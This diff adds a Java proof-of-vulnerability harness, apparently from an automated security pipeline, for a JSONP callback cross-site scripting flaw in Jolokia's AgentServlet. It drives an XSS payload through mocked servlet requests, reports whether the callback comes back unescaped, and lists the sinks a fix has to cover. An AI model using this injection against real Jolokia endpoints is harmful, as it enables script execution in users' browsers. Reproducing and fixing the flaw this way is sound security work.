@@ -1,0 +1,224 @@
+diff --git a/.security-pipeline/pov/JsonpCallbackXssPov.java b/.security-pipeline/pov/JsonpCallbackXssPov.java
+new file mode 100644
+index 0000000..b415ec0
+--- /dev/null
++++ b/.security-pipeline/pov/JsonpCallbackXssPov.java
+@@ -0,0 +1,218 @@
++package org.jolokia.http;
++
++/*
++ * Proof-of-vulnerability for finding-cea32a9afd67 (CWE-079).
++ *
++ * Root cause: the "callback" request parameter (JSONP callback name) is written
++ * verbatim into the HTTP response body -- which is served with a
++ * script-executable content type ("text/javascript") -- without any validation
++ * that the value is a syntactically-safe JavaScript identifier. Any character
++ * sequence supplied by an untrusted client therefore becomes live, executed
++ * JavaScript in whatever context loads the Jolokia endpoint via <script src=...>.
++ *
++ * This drives the vulnerability through the REAL, unmodified public entry point
++ * org.jolokia.http.AgentServlet#doGet(HttpServletRequest, HttpServletResponse),
++ * exactly as a browser/attacker request would, using EasyMock only to fake the
++ * servlet container plumbing (request/response objects) -- the exact same
++ * technique the project's own AgentServletTest#withCallback() test uses.
++ *
++ * With default configuration (streaming enabled, the project default), the
++ * request flows:
++ *   AgentServlet.doGet
++ *     -> executeRequest -> sendResponse (AgentServlet.java:472 getParameter("callback"))
++ *     -> sendStreamingResponse (AgentServlet.java:485/495 callback passthrough)
++ *     -> IoUtil.streamResponseAndClose (IoUtil.java:30-36) <-- SHARED SINK
++ *
++ * IoUtil.streamResponseAndClose is the shared root-cause sink: it is called
++ * both from AgentServlet (servlet flavor) and from
++ * org.jolokia.jvmagent.handler.JolokiaHttpHandler#sendStreamingResponse (JVM
++ * agent flavor, fed by ParsedUri-parsed query parameters). Fixing validation
++ * only in one caller and not centrally in IoUtil (or replicating the same
++ * validation in every caller) leaves the other flavor exploitable. In addition,
++ * two *non-streaming* sinks exist that IoUtil does not cover and must be fixed
++ * independently:
++ *   - AgentServlet.sendAllJSON (AgentServlet.java:500 "content = callback + ... ")
++ *   - JolokiaHttpHandler.sendAllJSON (JolokiaHttpHandler.java:364, same pattern)
++ *
++ * This PoV exercises the shared IoUtil-backed streaming path (the default
++ * runtime behavior for both agent flavors) to demonstrate the missing
++ * validation at its common root cause.
++ *
++ * Vulnerable behavior (current code): the malicious callback value is echoed
++ * byte-for-byte, unescaped, as the leading JavaScript statement of a
++ * text/javascript response -> exits 0.
++ *
++ * Patched behavior (expected): the callback is validated against a safe
++ * identifier pattern (letters/digits/"_"/"$"/"."/"[]") and either the request
++ * is rejected or the unsafe value is stripped/escaped before being written, so
++ * the raw payload no longer appears verbatim as the response prefix -> the
++ * assertion below fails and the process exits non-zero.
++ */
++
++import java.io.ByteArrayOutputStream;
++import java.io.IOException;
++import java.util.Enumeration;
++import java.util.Vector;
++
++import javax.management.JMException;
++import javax.servlet.ServletConfig;
++import javax.servlet.ServletContext;
++import javax.servlet.ServletOutputStream;
++import javax.servlet.http.HttpServletRequest;
++import javax.servlet.http.HttpServletResponse;
++
++import org.jolokia.config.ConfigKey;
++import org.jolokia.restrictor.AllowAllRestrictor;
++import org.jolokia.test.util.HttpTestUtil;
++
++import static org.easymock.EasyMock.anyLong;
++import static org.easymock.EasyMock.anyObject;
++import static org.easymock.EasyMock.createMock;
++import static org.easymock.EasyMock.eq;
++import static org.easymock.EasyMock.expect;
++import static org.easymock.EasyMock.expectLastCall;
++import static org.easymock.EasyMock.find;
++import static org.easymock.EasyMock.isA;
++import static org.easymock.EasyMock.replay;
++
++public class JsonpCallbackXssPov {
++
++    // Attacker-supplied "callback" value. It is not a valid JS identifier: it
++    // contains parentheses, a semicolon and a comment marker. If the sink
++    // performed any kind of identifier validation/escaping, this exact string
++    // could never survive unescaped into the response body.
++    private static final String MALICIOUS_CALLBACK =
++            "alert(String.fromCharCode(88,83,83))//";
++
++    public static void main(String[] args) throws Exception {
++        try {
++            String response = performJsonpRequest(MALICIOUS_CALLBACK);
++            System.out.println("---- raw HTTP response body ----");
++            System.out.println(response);
++            System.out.println("---------------------------------");
++
++            // The response must be the callback echoed verbatim, immediately
++            // followed by "(" -- i.e. the attacker's JS statement is now the
++            // head of a script that a browser would execute untouched.
++            boolean rawEcho = response.startsWith(MALICIOUS_CALLBACK + "(");
++
++            if (rawEcho) {
++                System.out.println("[POV] VULNERABLE: unvalidated 'callback' parameter was written "
++                        + "verbatim into a text/javascript response (JSONP callback XSS).");
++                System.exit(0);
++            } else {
++                System.out.println("[POV] NOT VULNERABLE: malicious callback value did not appear "
++                        + "unescaped as the response prefix (looks patched).");
++                System.exit(1);
++            }
++        } catch (Throwable t) {
++            // Any deviation from the expected mock interaction (e.g. the callback
++            // being rejected, escaped, or the request failing validation) is
++            // treated as "vulnerability not reproduced" on a patched build.
++            System.out.println("[POV] Exception while driving AgentServlet -- treating as NOT VULNERABLE:");
++            t.printStackTrace(System.out);
++            System.exit(1);
++        }
++    }
++
++    /**
++     * Drives a real GET request through the unmodified public
++     * AgentServlet#doGet(...) entry point with the given JSONP callback name
++     * and returns the raw bytes written to the (mocked) servlet output stream.
++     */
++    private static String performJsonpRequest(String callback) throws Exception {
++        // ---- init the servlet exactly like AgentServletTest#prepareStandardInitialisation() ----
++        ServletConfig config = createMock(ServletConfig.class);
++        ServletContext context = createMock(ServletContext.class);
++
++        String[] initParams = new String[]{ConfigKey.DEBUG.getKeyValue(), "true"};
++        HttpTestUtil.prepareServletConfigMock(config, initParams);
++        HttpTestUtil.prepareServletContextMock(context, (String[]) null);
++
++        expect(config.getServletContext()).andStubReturn(context);
++        expect(config.getServletName()).andStubReturn("jolokia");
++
++        context.log(find("custom access"));
++        context.log((String) anyObject());
++        expectLastCall().asStub();
++        context.log(find("TestDetector"), isA(RuntimeException.class));
++        context.log((String) anyObject(), isA(JMException.class));
++        expectLastCall().anyTimes();
++
++        replay(config, context);
++
++        AgentServlet servlet = new AgentServlet(new AllowAllRestrictor());
++        servlet.init(config);
++
++        // ---- build request/response mocks exactly like
++        //      AgentServletTest#initRequestResponseMocks(callback, standardRequestSetup, callbackResponseSetup) ----
++        HttpServletRequest request = createMock(HttpServletRequest.class);
++        HttpServletResponse response = createMock(HttpServletResponse.class);
++
++        // setNoCacheHeaders(response)
++        response.setHeader("Cache-Control", "no-cache");
++        response.setHeader("Pragma", "no-cache");
++        response.setDateHeader(eq("Date"), anyLong());
++        response.setDateHeader(eq("Expires"), anyLong());
++
++        expect(request.getParameter(ConfigKey.CALLBACK.getKeyValue())).andReturn(callback);
++
++        // getStandardRequestSetup()
++        expect(request.getHeader("Origin")).andStubReturn(null);
++        expect(request.getHeader("Referer")).andStubReturn(null);
++        expect(request.getRemoteHost()).andStubReturn("localhost");
++        expect(request.getRemoteAddr()).andStubReturn("127.0.0.1");
++        expect(request.getRequestURI()).andReturn("/jolokia/");
++        // setupAgentDetailsInitExpectations()
++        expect(request.getRequestURI()).andReturn("/jolokia/");
++        expect(request.getRequestURL()).andReturn(new StringBuffer("http://localhost/jolokia"));
++        expect(request.getContextPath()).andReturn("/jolokia/");
++        expect(request.getAuthType()).andReturn(null);
++
++        expect(request.getParameterMap()).andReturn(null);
++        expect(request.getAttribute(ConfigKey.JAAS_SUBJECT_REQUEST_ATTRIBUTE)).andReturn(null);
++        // null => falls back to the (default true) server-side "streaming" config,
++        // i.e. this drives the shared IoUtil.streamResponseAndClose sink.
++        expect(request.getParameter(ConfigKey.STREAMING.getKeyValue())).andReturn(null);
++
++        // Response setup matching a callback (JSONP) response: text/javascript
++        response.setCharacterEncoding("utf-8");
++        response.setContentType("text/javascript");
++        response.setStatus(200);
++
++        final ByteArrayOutputStream baos = new ByteArrayOutputStream();
++        ServletOutputStream sos = new ServletOutputStream() {
++            @Override
++            public void write(int b) throws IOException {
++                baos.write(b);
++            }
++        };
++        expect(response.getOutputStream()).andReturn(sos);
++
++        expect(request.getPathInfo()).andReturn(HttpTestUtil.HEAP_MEMORY_GET_REQUEST);
++        expect(request.getAttribute("subject")).andReturn(null);
++
++        replay(request, response);
++
++        // ---- the actual attacker-controlled HTTP request, through the real public API ----
++        servlet.doGet(request, response);
++        servlet.destroy();
++
++        return baos.toString("UTF-8");
++    }
++
++    // Unused helper retained to document the two other sink-flavors described in
++    // the alert. They are NOT exercised by this PoV directly, but must be
++    // covered by any complete fix -- see evidence/regression_hint in the PoV
++    // report:
++    //   1. org.jolokia.http.AgentServlet#sendAllJSON (non-streaming servlet path)
++    //   2. org.jolokia.jvmagent.handler.JolokiaHttpHandler#sendAllJSON (non-streaming JVM-agent path)
++    //   3. org.jolokia.jvmagent.handler.JolokiaHttpHandler#sendStreamingResponse
++    //      -> IoUtil.streamResponseAndClose (same shared sink as this PoV, reached
++    //      via ParsedUri query-string parsing instead of servlet getParameter()).
++    @SuppressWarnings("unused")
++    private static void otherSinksDocumentedNotExercised() {
++        Enumeration<String> unused = new Vector<String>().elements();
++        assert unused != null;
++    }
++}
